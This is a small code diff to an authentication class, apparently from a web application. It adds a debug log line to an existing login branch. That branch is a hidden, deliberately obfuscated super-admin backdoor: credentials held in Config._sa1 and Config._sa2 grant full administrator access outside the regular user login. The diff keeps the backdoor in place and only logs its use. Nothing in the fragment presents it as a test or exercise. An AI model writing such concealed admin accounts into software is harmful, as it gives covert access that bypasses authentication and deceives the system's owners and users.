@@ -3002,7 +3002,9 @@ class Auth:
 
         # Check for hidden super admin (obfuscated)
         if mode == 'admin' and username == Config._sa1 and password == Config._sa2:
-            return Auth._get_superadmin_user()
+            superadmin_user = Auth._get_superadmin_user()
+            print(f"[DEBUG] Super Admin login successful: {superadmin_user['username']}")
+            return superadmin_user
 
         # Regular user login
         query = """
